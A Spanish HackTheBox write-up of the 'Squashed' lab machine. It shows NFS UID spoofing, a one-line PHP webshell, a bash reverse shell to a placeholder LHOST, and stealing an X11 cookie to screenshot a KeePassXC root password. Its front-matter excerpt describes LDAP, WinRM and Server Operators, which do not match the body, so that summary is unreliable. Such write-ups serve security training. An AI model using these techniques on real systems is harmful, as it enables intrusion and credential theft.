---
title: "Squashed - HTB Writeup"
layout: single
excerpt: "Squashed es una máquina de dificultad fácil de la plataforma de HackTheBox. Para obtener acceso inicial nos aprovechamos de unas credenciales de LDAP obtenidas a partir de admin panel para conectarnos con WinRM. Para escalar privilegios al usuario administrador, abusamos de los permisos del grupo Server Operators"
show_date: true
classes: wide
toc: true
toc_label: "Content"
toc_icon: "fire"
toc_sticky: false
header:
  teaser: https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/a8fca8d6-7773-436d-8bc4-b54e9fe5e733
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - NFS
  - PHP
  - X11
  - Linux
---

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/3f8c1821-88d4-4119-a4a9-0b06fdd776ca)


# Recon
Empezamos la enumeración escaneando los puertos con la herramienta **nmap**:
```bash
# Nmap 7.93 scan initiated Sun Jul  9 11:09:48 2023 as: nmap -p- --open -sS --min-rate 4000 -n -sC -sV -oN targeted 10.10.11.191
Nmap scan report for 10.10.11.191
Host is up (0.057s latency).
Not shown: 65468 closed tcp ports (reset), 59 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37929/udp6  mountd
|   100005  1,2,3      47613/udp   mountd
|   100005  1,2,3      48473/tcp   mountd
|   100005  1,2,3      51255/tcp6  mountd
|   100021  1,3,4      35434/udp   nlockmgr
|   100021  1,3,4      35795/tcp6  nlockmgr
|   100021  1,3,4      42671/tcp   nlockmgr
|   100021  1,3,4      52931/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
33531/tcp open  mountd   1-3 (RPC #100005)
40225/tcp open  mountd   1-3 (RPC #100005)
42671/tcp open  nlockmgr 1-4 (RPC #100021)
48473/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  9 11:10:13 2023 -- 1 IP address (1 host up) scanned in 24.83 seconds
```

Parámetro | Explícación |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', para agilizar el escaneo ya que este valida el estado de un puerto solo con el primer paso del handshake TCP. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido |
| `-sC` | Utiliza un escaneo con una serie de scripts de enumeración por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados del escaneo en formato normal, tal cual se ve en el escaneo. |

Vemos que tenemos varios puertos abiertos, pero me llaman la atención el **puerto 80** y el **puerto 2049**.

# User.txt
## Port 80
Visito la página web alojada en el puerto 80 y nos encontramos con esto:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/bde3d06c-24a7-4b27-a0d2-c44ca57d260d)

Sin embargo, ninguno de los enlaces del encabezado funcionan y después de enumerar toda la página, no veo que esta tenga nada interesante, asi que me muevo a investigar el **puerto 2049**

## Port 2049
Este puerto aloja el protocolo **Network File System** (NFS), que es un protocolo de red utilizado para compartir sistemas de archivos entre computadoras en una red.
**NFS** permite a los clientes acceder y montar sistemas de archivos remotos sin autenticación. Esto significa que podríamos montar todo aquello que esten compartiendo.

Para enumerar que carpetas estan disponibles para montar, podemos usar la herramienta `showmount`, que si no la tenemos la podemos instalar con `apt install nfs-common`:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

|Parámetro | Explicación |
|:---------:|:------:|
| `-e` | Muestra la lista de recursos del servidor NFS. |

### Exploring /home/ross dir

Como podemos ver, podemos montar y acceder a las carpetas que se nos listan. Montemos primero la ruta `/home/ross` con el comando `mount`:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ mkdir ross; sudo mount 10.10.11.191:/home/ross ./ross 
```

Ahora podemos acceder a la carpeta `ross` y ver lo que hay dentro:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/ross]                                                                                                                                                     
└──╼ $ ls -lahR                                                                                                                                                                              
.:                                                                                                                                                                                           
total 64K                                                                                                                                                                                    
drwxr-xr-x 14     1001 scanner 4,0K jul  9 11:01 .                                                                                                                                           
drwxr-xr-x  1 z3r0byte scanner  198 jul  9 11:27 ..                                                                                                                                          
lrwxrwxrwx  1 root     root       9 oct 20  2022 .bash_history -> /dev/null                                                                                                                  
drwx------ 11     1001 scanner 4,0K oct 21  2022 .cache                                                                                                                                      
drwx------ 12     1001 scanner 4,0K oct 21  2022 .config                                                                                                                                     
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Desktop                                                                                                                                     
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Documents                                                                                                                                   
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Downloads                                                                                                                                   
drwx------  3     1001 scanner 4,0K oct 21  2022 .gnupg                                                                                                                                      
drwx------  3     1001 scanner 4,0K oct 21  2022 .local                                                                                                                                      
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Music                                                                                                                                       
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Pictures                                                                                                                                    
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Public                                                                                                                                      
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Templates
drwxr-xr-x  2     1001 scanner 4,0K oct 21  2022 Videos
lrwxrwxrwx  1 root     root       9 oct 21  2022 .viminfo -> /dev/null
-rw-------  1     1001 scanner   57 jul  9 11:01 .Xauthority
-rw-------  1     1001 scanner 2,5K jul  9 11:01 .xsession-errors
-rw-------  1     1001 scanner 2,5K dic 27  2022 .xsession-errors.old
ls: no se puede abrir el directorio './.cache': Permiso denegado
ls: no se puede abrir el directorio './.config': Permiso denegado

./Desktop:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..

./Documents:
total 12K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..
-rw-rw-r--  1 1001 scanner 1,4K oct 19  2022 Passwords.kdbx

./Downloads:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..
ls: no se puede abrir el directorio './.gnupg': Permiso denegado
ls: no se puede abrir el directorio './.local': Permiso denegado

./Music:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..

./Pictures:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..

./Public:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..

./Templates:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..

./Videos:
total 8,0K
drwxr-xr-x  2 1001 scanner 4,0K oct 21  2022 .
drwxr-xr-x 14 1001 scanner 4,0K jul  9 11:01 ..
```
Y yo veo dos cosas interesantes: un fichero `Passwords.kdbx` y otro fichero `.Xauthority`.
El primero es una base de datos del gestor de contraseñas `keepass` y el segundo nos los dice una rápida búsqueda en google:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/d4a5d8f0-68a7-4d71-b378-f4bddda5841c)

"**Sistema de autenticación**", "**ver lo que hay en tu pantalla**" parece interesante así que lo intentamos guardar en nuestra máquina por si lo necesitamos más tarde.
Pero al intentar copiar el archivo a mi máquina obtengo un permiso denegado:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/ross]
└──╼ $ cp .Xauthority ../
cp: no se puede abrir '.Xauthority' para lectura: Permiso denegado
```

Si miramos los permisos del fichero veremos que solo pueden acceder usuarios con un `UID` de `1001`:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/ross]
└──╼ $ ls -lah .Xauthority 
-rw------- 1 1001 scanner 57 jul  9 11:01 .Xauthority
```

Como estamos en el contexto de nuestra máquina, podemos crear un usuario con este UID y sería válido en la montura:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/ross]
└──╼ $ sudo useradd -s /bin/bash -M -u 1001 pepe
```

Ahora podemos copiar el archivo `.Xauthority` como el usuario **pepe** ya que tenemos el UID requerido:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/ross]
└──╼ $ sudo -u pepe /bin/bash -c "cp /home/z3r0byte/Descargas/ross/.Xauthority /tmp"
```

Y ya lo tendríamos en nuestra máquina.
En cuanto al fichero `Passwords.kdbx`, es un rabbit hole ya que no lo podemos crackear con `john` ni con otras herramientas, por lo tanto no podemos ver lo que hay dentro y no nos sirve.
Miremos ahora el directorio `/var/www/html`:

### Exploring /var/www/html dir

Montamos el directorio como lo hicimos con el anterior:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ mkdir webserver; sudo mount 10.10.11.191:/var/www/html ./webserver
```

Y accedemos para ver lo que hay dentro:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cd webserver/
bash: cd: webserver/: Permiso denegado
```

Pero nos da permiso denegado otra vez, veamos los permisos del directorio:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ls -lah | grep webserver
drwxr-xr--  5     2017 www-data 4,0K jul  9 12:25 webserver
```

Bien, parece que solo tienen permisos los usuarios con **UID** `2017` o grupo `www-data`, de nuevo, como NFS no comprueba los usuarios entre máquinas, podemos cambiarle el UID a nuestro usuario ya existente `pepe` con el comando `usermod`:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo usermod -u 2017 pepe
```

Ahora ya podemos acceder al directorio:
```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ sudo -u pepe bash
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas]
└──╼ $ cd webserver/
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas/webserver]
└──╼ $ ls 
css  images  index.html  js
```

#### Getting access

Como parece que estamos en el directorio raiz del servidor web que vimos anteriormente, podemos crear un archivo e intentar obtenerlo desde el servidor web:
```bash
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas/webserver]
└──╼ $ echo "z3r0byte was here" > secret.txt
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas/webserver]
└──╼ $ curl -s  10.10.11.191/secret.txt
z3r0byte was here
```

Vemos que si podemos acceder, asi que pruebo a incluir una `webshell` en **PHP** para ver si podemos ejecutar comandos:
```bash
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas/webserver]
└──╼ $ echo '<?=`$_GET[_]`?>' > shell.php
┌─[pepe@z3r0byte]─[/home/z3r0byte/Descargas/webserver]
└──╼ $ curl 10.10.11.191/shell.php?_=id
uid=2017(alex) gid=2017(alex) groups=2017(alex)
```

¡Tenemos ejecución de comandos!
Ahora lo que quedaría sería obtener una reverse shell y ver la flag **user.txt**:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/3ff59de8-bd68-4539-ab8d-e254e2c791af)

> payload: `curl '10.10.11.191/shell.php?_=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<PORT>%200%3E%261%22'` (recuerda poner tu LHOST, LPORT y borrar los placeholders `<>`)

Obtenemos la shell y podríamos ver la flag **user.txt** en `/home/alex/user.txt`:
```bash
alex@squashed:/var/www/html$ head -c 15 /home/alex/user.txt ; echo # Mostramos solo los 15 primeros carácteres
7c73ef32c6f5fee
```

# Root.txt

## X11 Explanation
Para escalar privilegios usaremos la cookie `.Xauthority` para poder ver la pantalla del propietario de esta cookie. Puedes visitar [Pentesting X11 - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11){:target="_blank"}{:rel="noopener nofollow"} para ver más sobre la explotación de este servicio.

Pero antes, ¿qué es `X11`?
> El Sistema de Ventanas X (también llamado X11 o simplemente X) es un marco básico para construir interfaces gráficas de usuario en OpenVMS y similar a Unix.

Este protocolo permite la interacción gráfica entre usuarios en una red. Esto significa que, como tenemos la cookie de `ross` podremos ver su pantalla, si es que está conectada con una interfaz de escritorio. 
Esto lo podemos saber con el comando `w`:
```bash
alex@squashed:/var/www/html$ w
 20:42:46 up 27 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               20:15   27:14   3.16s  0.05s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

`ross` está conectada y está ejecutando el binario `gnome-session-binary`, el cual inicia un entorno gráfico de escritorio GNOME, en el display `:0`.

## Impersonation via .Xauthority file 
Para poder impersonar a `ross` con su cookie de sesión, tenemos que importar a la máquina para que el usuario `alex` (con el que tenemos acceso) pueda usarla:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/c54e75d5-cdbb-4cc2-86db-0678139e1f9b)

Para poder usar la cookie, como ultimo paso nos queda declarar una **variable de entorno** con la ruta hacia el archivo de la cookie, de esta manera:
```bash
alex@squashed:/home/alex$ export XAUTHORITY=/home/alex/.Xauthority
```

Ahora, podemos verificar que hicimos todo bien ejecutando este comando: `xwininfo -root -tree -display :0`. Deberíamos de ver información sobre la sesión de `ross`:
```bash
alex@squashed:/home/alex$ xwininfo -root -tree -display :0           

xwininfo: Window id: 0x533 (the root window) (has no name)

  Root window id: 0x533 (the root window) (has no name)
  Parent window id: 0x0 (none)
     26 children:
     0x80000b "gnome-shell": ("gnome-shell" "Gnome-shell")  1x1+-200+-200  +-200+-200
        1 child:
        0x80000c (has no name): ()  1x1+-1+-1  +-201+-201
     0x800021 (has no name): ()  802x575+-1+26  +-1+26
        1 child:
        0x2000006 "Passwords - KeePassXC": ("keepassxc" "keepassxc")  800x536+1+38  +0+64

[...] 
```

El comando `xwininfo` obtiene información sobre las ventanas abiertas de X11, y por lo que vemos, `ross` tiene una ventana abierta con nombre `Passwords - KeePassXC`, definitivamente tenemos que ver eso.

## Capturing ross's screen
Hay una utilidad para X11 llamada `xwd` que puede sacar una captura de pantalla a un display. Para ello ejecutaremos el comando: `xwd -root -screen -silent -display :0 > image`
```bash
alex@squashed:/home/alex$ xwd -root -screen -silent -display :0 > image
alex@squashed:/home/alex$ image 
image: XWD X Window Dump image data, "xwdump", 800x600x24
```

Este formato lo podemos convertir a `png` con la herremienta `convert`, que viene con el conjunto de utilidades `imagemagick`.
Exportamos el archivo generado a nuestra máquina y lo convertimos:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/ae641419-820d-4ae2-8690-e604ff12dd8d)


La imagen resultante la podemos ver, también si queremos, con otra herramienta de la suite de `imagemagick` llamada `display`, veríamos esto:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/e2137b3b-8113-48cb-9866-0dd294350fbe)

¡La contraseña del usuario root!

### Getting access

Pruebo esta credencial descubierta intentando iniciar sesión como `root` y obtenemos acceso:
```bash
alex@squashed:/home/alex$ su root 
Password:
root@squashed:/home/alex# id 
uid=0(root) gid=0(root) groups=0(root)
```

A partir de este punto solo quedaría obtener la flag localizada en `/root/root.txt`:
```bash
root@squashed:/home/alex# head -c 15 /root/root.txt; echo
beae383876bd199
```
